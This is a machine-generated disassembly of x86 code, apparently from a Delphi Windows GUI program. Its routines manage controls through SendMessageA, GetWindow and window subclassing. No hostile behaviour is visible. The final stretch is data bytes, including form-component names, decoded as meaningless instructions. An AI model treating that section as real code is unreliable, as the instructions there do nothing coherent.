lea eax [ esi + 0x10 ]
call sub_40442c
pop esi
pop ebx
retn
dec cl
je r-xdata
mov eax esi
call sub_4174f4
test [ eax + 0x1c ] 0x8
jne r-xdata
jmp r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
call sub_416e68
push eax
push 0x144
mov eax esi
call sub_4174f4
call sub_448484
push eax
call SendMessageA
sub_483d30
push ebx
push esi
push edi
push ebp
add esp 0xffffffdc
mov edi edx
mov esi eax
mov eax esp
xor ecx ecx
mov edx 0x24
call sub_402fc4
mov [ esp + 0x4 ] edi
xor eax eax
mov [ esp + 0xc ] eax
mov eax esp
push eax
push 0x0
push 0x404
mov eax esi
call sub_4174f4
call sub_448484
push eax
call SendMessageA
test eax eax
sete al
neg al
sbb ebp ebp
mov edx edi
mov eax esi
call sub_483c98
mov ebx eax
mov [ esp ] 0x37
mov eax [ ebx + 0x10 ]
call sub_4048dc
mov [ esp + 0x8 ] eax
mov eax ebx
call sub_416e68
mov [ esp + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_4046e4
mov [ esp + 0xc ] eax
mov eax [ ebx + 0x18 ]
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x14 ] eax
mov eax [ ebx + 0x20 ]
mov [ esp + 0x18 ] eax
mov eax [ ebx + 0x24 ]
mov [ esp + 0x1c ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x20 ] eax
test ebp ebp
je r-xdata
mov eax esp
push eax
push edi
push 0x405
mov eax esi
call sub_4174f4
call sub_448484
push eax
call SendMessageA
mov eax esp
push eax
push edi
push 0x401
mov eax esi
call sub_4174f4
call sub_448484
push eax
call SendMessageA
jmp r-xdata
add esp 0x24
pop ebp
pop edi
pop esi
pop ebx
retn
sub_483e14
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax 0x200
call sub_473b14
mov ecx esi
xor edx edx
mov eax ebx
call sub_432cf0
push ebx
push sub_48422c
call sub_41f228
mov [ ebx + 0x270 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_484698
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x108 ]
mov eax [ ebx + 0x23c ]
mov [ eax + 0x10 ] ebx
mov eax [ eax + 0x14 ]
mov [ ebx + 0x284 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403690
mov esi eax
mov [ ebx + 0x274 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_484088
mov [ ebx + 0x281 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_483ec4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_4036c0
lea eax [ esi + 0x274 ]
call sub_40dabc
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax [ esi + 0x270 ]
call sub_41f2c0
lea eax [ esi + 0x27c ]
call sub_40dabc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_432de4
test bl bl
jle r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xac ]
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_483f2c
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov eax [ eax + 0x8 ]
sub eax 0xfffffcdb
je r-xdata
cmp [ esi + 0x292 ] 0x0
je r-xdata
dec eax
jne r-xdata
pop esi
retn
mov edx esi
mov eax [ esi + 0x294 ]
call [ esi + 0x290 ]
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x28a ] 0x0
je r-xdata
mov edx esi
mov eax [ esi + 0x28c ]
call [ esi + 0x288 ]
pop esi
retn
sub_483f7c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax 0x200
call sub_473ae8
mov edx ebx
mov eax esi
call sub_4453e0
mov ecx r-xdata
mov edx ebx
mov eax esi
call sub_44530c
mov eax [ ebx + 0x4 ]
or eax 0x10000
or eax 0x200000
or eax 0x2000000
or eax 0x4
or eax 0x40
xor edx edx
mov dl [ esi + 0x281 ]
or eax [ edx * 4 + rw-data ]
mov [ ebx + 0x4 ] eax
and [ ebx + 0x8 ] 0xfffffdff
mov eax [ ebx + 0x24 ]
or eax 0x8
and eax 0xfffffffc
mov [ ebx + 0x24 ] eax
pop esi
pop ebx
retn
sub_483ff4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x278 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x278 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x274 ]
call sub_44fc00
mov eax ebx
call sub_448788
test al al
je r-xdata
mov edx [ ebx + 0x274 ]
call sub_44fc44
mov edx ebx
mov eax [ ebx + 0x278 ]
call sub_41e274
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_442f30
mov eax ebx
call sub_445ac0
mov eax [ ebx + 0x278 ]
call sub_44ef40
push eax
push 0x0
push 0x402
mov eax ebx
call sub_448484
push eax
call PostMessageA
pop esi
pop ebx
retn
sub_484088
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44ef40
push eax
xor ecx ecx
mov edx 0x402
mov eax ebx
call sub_442f30
sub_4840b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_433444
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x281 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_421d14
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4840fc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_441234
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x278 ]
jne r-xdata
xor eax eax
mov [ edi + 0x278 ] eax
sub_48412c
push ebx
mov ebx eax
mov eax ebx
call sub_443958
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
pop ebx
retn
cmp [ ebx + 0x281 ] 0x2
jae r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_484154
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_447a04
mov eax ebx
call sub_448788
test al al
je r-xdata
add esp 0x10
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x268 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x240 ]
test eax eax
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
push 0x0
lea edx [ esp + 0x4 ]
push edx
push eax
call InvalidateRect
sub_4841b4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_443404
mov eax ebx
call sub_441f8c
test al al
je r-xdata
cmp [ ebx + 0x281 ] 0x2
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4592cc
test eax eax
je r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc0 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_442424
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_441f9c
sub_48424c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4337ac
push 0x5
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindow
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] ebx
mov esi ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x268 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x281 ]
sub al 0x2
jae r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
push 0x5
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call GetWindow
push eax
call GetWindow
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x27c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x240 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x281 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x278 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0x1
xor eax eax
push ebp
push sub_48444e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x27c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
call sub_4171e4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
push 0x0
push 0x3
push 0xd3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SendMessageA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x240 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x250 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
push eax
call SetWindowLongA
mov eax [ ebp - 0x4 ]
mov esi ebx
mov [ eax + 0x244 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push ebx
call GetWindow
mov ebx eax
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_44ef40
push eax
push 0x0
push 0x402
mov eax [ ebp - 0x4 ]
call sub_448484
push eax
call PostMessageA
mov eax [ ebp - 0x4 ]
add eax 0x27c
call sub_40dabc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_441e58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x280 ] 0x0
retn
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x284 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
inc esi
dec ebx
jne r-xdata
sub_4844a8
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_448f54
mov eax esi
mov edx [ r-xdata ]
call sub_40384c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov edx [ esi + 0xa4 ]
mov eax edi
call sub_483ff4
cmp [ edi + 0x278 ] 0x0
jne r-xdata
mov edx [ esi + 0xc8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
inc eax
je r-xdata
test bl bl
je r-xdata
sub_48450c
push ebx
mov ebx eax
mov eax ebx
call sub_433994
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop ebx
retn
mov eax ebx
call sub_448788
test al al
je r-xdata
mov eax ebx
call sub_445ac0
sub_484550
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x284 ]
call sub_4171e4
test eax eax
jle r-xdata
mov eax ebx
call sub_4458bc
pop esi
pop ebx
retn
cmp [ ebx + 0x27c ] 0x0
jne r-xdata
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416fc0
mov esi eax
mov [ ebx + 0x27c ] esi
mov edx [ ebx + 0x284 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_4845a0
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax esi
call sub_448788
test al al
je r-xdata
mov eax ebx
pop esi
pop ebx
retn
call GetFocus
cmp eax [ esi + 0x240 ]
je r-xdata
mov bl 0x1
cmp eax [ esi + 0x244 ]
je r-xdata
cmp eax [ esi + 0x268 ]
je r-xdata
xor ebx ebx
jmp r-xdata
sub_4845dc
push ebx
push esi
mov esi edx
mov eax [ eax + 0x14 ]
call sub_483c24
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov eax ebx
call sub_416e68
pop esi
pop ebx
retn
sub_484600
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov eax [ eax + 0x14 ]
call sub_483c24
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
mov eax ebx
call sub_416e68
pop edi
pop esi
pop ebx
retn
sub_484630
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_48468e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_417110
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_448788
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484695
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x24 ]
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_445ac0
sub_484698
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403690
mov eax edi
mov edx [ eax ]
call [ edx + 0x84 ]
push eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x80 ]
mov ecx esi
mov dl 0x1
call sub_41752c
mov [ edi + 0x14 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403a24
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403a7c
pop [ fs : 0x0 ]
add esp 0xc
sub_4846f4
push ebx
push esi
call sub_403a8c
mov ebx edx
mov esi eax
lea eax [ esi + 0x14 ]
call sub_40dabc
mov edx ebx
and dl 0xfc
mov eax esi
call sub_417574
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403a74
sub_484730
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_48486d
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx [ eax + 0x10 ]
lea eax [ ebp - 0x4 ]
call sub_4044c4
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x10 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
pop edx
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x18 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x18 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
pop edx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x1c ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x1c ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
pop edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov eax [ eax + 0x20 ]
push eax
mov edx edi
mov eax [ ebx + 0x14 ]
call sub_46da90
pop edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484874
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_48487c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx [ eax + 0x10 ]
mov eax edi
call sub_404480
pop edi
pop esi
pop ebx
retn
sub_4848d0
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0xffffffff
mov eax [ edi + 0x14 ]
call sub_4171e4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov [ esp ] ebx
jmp r-xdata
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_46da90
mov eax [ eax + 0x10 ]
mov edx ebp
call sub_4086e8
test eax eax
jne r-xdata
sub_484938
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_46da90
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
pop edi
pop esi
pop ebx
retn
sub_484958
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop edi
pop esi
pop ebx
retn
sub_484980
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x10 ]
call sub_448788
test al al
je r-xdata
pop esi
pop ebx
retn
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax [ esi + 0x10 ]
call sub_448484
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
mov eax [ esi + 0x10 ]
call sub_4422a0
sub_484a90
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_484af8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_47db78
mov ebx eax
mov ecx esi
xor edx edx
mov eax ebx
call sub_47d7d0
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_47d618
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_47d6c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484aff
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_484b08
push ebx
push esi
mov esi edx
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x22c ]
call sub_47db78
mov ebx eax
mov ecx [ esi + 0x18 ]
xor edx edx
mov eax ebx
call sub_47d7d0
mov edx [ esi + 0x10 ]
mov eax ebx
call sub_47d618
mov edx [ esi + 0x14 ]
mov eax ebx
call sub_47d6c8
pop esi
pop ebx
retn
sub_484b40
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x84 ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x20 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403870
mov edx edi
mov eax esi
call sub_48104c
sub_484b74
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_4048cc
xor eax eax
push ebp
push sub_484bd4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x20 ]
mov edx [ r-xdata ]
call sub_403870
push esi
push 0xffffffff
push 0xffffffff
mov edx [ ebp + 0x8 ]
push edx
mov eax [ eax + 0x284 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_483c30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484bdb
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
sub_484be4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ esi + 0x20 ]
mov edx [ r-xdata ]
call sub_403870
mov edx [ ebx + 0x18 ]
push edx
push 0xffffffff
push 0xffffffff
mov ecx [ ebx + 0x14 ]
push ecx
mov eax [ eax + 0x284 ]
mov ecx edx
mov edx [ ebx + 0x10 ]
call sub_483c30
pop esi
pop ebx
retn
sub_484c18
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_484c87
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484c8e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ed8
mov eax rw-data
mov edx [ r-xdata ]
call sub_404ed8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_484c9c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al 0x51
dec eax
add ah dl
dec ebp
dec eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx - 0x77ffb7b0 ] cl
add eax [ eax ]
add al cl
jl r-xdata
or al 0xe6
inc ecx
add [ ecx + esi * 8 + 0x45 ] bh
add [ eax ] cl
test al 0x45
add [ eax - 0x33ffbb76 ] dh
pop [ eax + eax + 0x18 ]
pop [ eax + eax - 0x58 ]
adc [ eax + eax + 0x2c ] al
test [ eax + eax + 0x4 ] eax
mov ah 0x45
add [ edx + eax * 4 + 0xff00044 ] ah
inc esp
add ah dh
cmove eax [ eax ]
clc
mov ah 0x45
add [ eax ] bh
inc eax
inc esp
add [ ebx + ebx ] dh
inc esp
add [ ecx + edx + 0x44 ] ch
add al al
sbb al 0x44
add ah ch
mov dh 0x45
add [ eax - 0x7ffba4b ] bh
sbb eax 0xb7640044
inc ebp
add [ eax + eax * 2 - 0x7d07ffbc ] bh
inc esp
add [ ebx + eax * 4 + 0x44 ] dh
add [ eax + 0x5800447e ] dh
add [ eax + eax + 0x4 ] 0xffffffa6
inc ebp
add [ ebp + edi * 4 + 0x45 ] ch
add al al
pop ecx
inc esp
add [ eax ] al
0x45
add [ ecx + ebp * 8 ] dl
inc ecx
add [ ecx + ebp * 4 - 0x54c3ffbb ] dl
inc ebp
add [ ecx + edi ] bl
inc eax
add al bl
into
inc ebp
add [ eax + 0x36 ] bl
inc eax
add [ esi + esi + 0x40 ] dh
add [ ebx + ebp * 4 - 0x7063ffbb ] ah
inc esp
add [ ecx + esi * 4 ] dl
inc ebp
add [ edx + ebp * 2 - 0x529bffbf ] al
inc ebp
add [ eax - 0x53ffba53 ] ah
scasb [ edi ]
inc ebp
add [ ebx + ebx + 0x44 ] cl
add [ ecx + ebp * 8 ] ch
inc ecx
add [ edi + esi * 4 ] ah
inc ebp
add [ esi ] cl
sub_484d80
pop esp
int 0x45
add [ esp + ecx * 8 ] bl
inc ebp
add [ eax + 0x5a ] bl
inc esp
add [ edx + ebx * 2 + 0x44 ] bl
add [ esi + ecx * 8 + 0x58bc0045 ] dl
inc esp
add [ eax - 0x77ffbb7c ] bl
aad 0x45
add [ ecx + eax * 4 + 0x44 ] dl
add [ edx + ebp * 8 + 0x45 ] bl
add al bh
lahf
inc ebp
add [ eax + 0x7c0045a2 ] ch
fild [ ebp ]
mov [ ebp + eax * 2 + 0x45ad0400 ] ch
add [ esi + ebp * 8 ] al
inc ebp
add ah cl
test eax 0xe9400045
inc ebp
add [ eax - 0x30 ] ah
inc ebp
add ah dh
0xb6e80045 0x45
sub_484dd4
add [ es : eax - 0xfffb7b0 ] dl
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc ebx
push 0x426b6365
outsd
js r-xdata
add [ eax + eax ] al
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
xor [ ebx + eax ] eax
add [ eax ] al
add eax 0x63410b00
je r-xdata
hlt
cmove esp [ ecx + 0x74 ]
push esp
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30831
add [ ecx ] al
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
push ebp
jo r-xdata
and al 0x3
add [ eax ] al
or al 0x0
push cs
dec eax
popad
jb r-xdata
or dl [ eax + 0x6f ]
jo r-xdata
or al 0x3
add [ eax ] al
push es
add [ edx + edx * 2 ] cl
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
outsb
xor [ eax ] edx
add eax [ eax ]
add [ edi ] al
add [ 0x6f6d654d ] al
xor [ ebx + eax ] edx
add [ eax ] al
or [ eax ] al
push es
dec esp
popad
bound esp [ ebp + 0x6c ]
xor [ eax ] ebx
add eax [ eax ]
add [ ecx ] cl
add [ edx ] cl
push eax
outsd
add eax 0x74696445
xor [ eax + 0x3 ] eax
add [ eax ] al
push es
add [ edx + edx * 2 ] cl
outsd
ja r-xdata
inc ebx
outsd
outsb
je r-xdata
insb
imul esp [ ebp + 0x6e ] 0x65744974
add [ edi ] cl
add [ esi ] cl
jo r-xdata
js r-xdata
dec eax
add eax [ eax ]
add [ 0x63410b00 ] al
je r-xdata
inc esp
inc ebx
xor dh [ eax ]
add eax [ eax ]
add [ esi ] cl
add [ ecx ] cl
push edx
imul esp [ ebx + 0x68 ] 0x74696445
xor [ ebx + eax ] esi
add [ eax ] al
str [ esi ]
insb
jb r-xdata
popad
imul ebp [ fs : edi + 0x42 ] 0x6f747475
or al 0x52
outsd
insb
xor [ eax ] ebp
add eax [ eax ]
add [ 0x6f4d0e00 ] cl
outsb
je r-xdata
outsb
outsb
jne r-xdata
dec ebp
popad
jae r-xdata
push esp
add eax [ eax ]
add [ eax + eax ] dl
push es
inc edx
jbe r-xdata
add [ ebx ] cl
inc esi
outsd
outsb
je r-xdata
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x34c32
je r-xdata
inc ebp
imul esi [ fs : ecx + esi + 0x60 ] 0x16000003
add [ edx ] dl
add [ ebx ] cl
push ebx
je r-xdata
je r-xdata
outsd
inc edx
jne r-xdata
popad
jb r-xdata
inc ebx
popad
insb
outsb
insd
sub al 0x3
add [ eax ] al
or al [ eax ]
pop es
inc ebx
sbb al 0x3
add [ eax ] al
or al [ eax ]
pop es
push ebp
jo r-xdata
je r-xdata
inc ebp
imul esi [ fs : edx + esi + 0x64 ] 0x17000003
inc esp
xor [ eax + 0x3 ] ebx
add [ eax ] al
adc eax 0x6d490600
popad
xor [ gs : si + 0x3 ] ebx
add [ eax ] al
push ss
add [ ecx ] cl
dec ebp
popad
insb
imul esp [ ecx + 0x6c ] 0x7431676f
add eax [ eax ]
add [ ebx ] bl
imul esp [ ecx + 0x6c ] 0x6831676f
add eax [ eax ]
add [ eax ] bl
add [ ebx ] cl
push ebx
popad
jbe r-xdata
insb
outsd
xor [ bx + si + 0x3 ] ebp
add [ eax ] al
sbb [ eax ] al
je r-xdata
add [ ebx ] dl
push eax
jb r-xdata
add [ eax ] al
sbb eax [ eax ]
adc edx [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x65537265
insd
xor [ ebx + eax ] edi
